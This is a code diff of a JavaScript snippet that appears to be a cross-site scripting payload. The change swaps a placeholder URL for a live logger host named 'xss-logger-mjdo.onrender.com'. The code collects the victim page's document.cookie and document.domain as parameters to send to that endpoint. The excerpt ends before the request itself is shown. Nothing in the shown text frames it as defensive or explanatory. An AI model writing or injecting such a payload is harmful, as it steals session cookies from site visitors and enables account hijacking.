@@ -1,5 +1,5 @@
 (function () {
-  const endpoint = 'https://YOUR-RENDER-URL.onrender.com/log';
+  const endpoint = 'https://xss-logger-mjdo.onrender.com/log';
   const params = new URLSearchParams({
     c: document.cookie,
     d: document.domain,
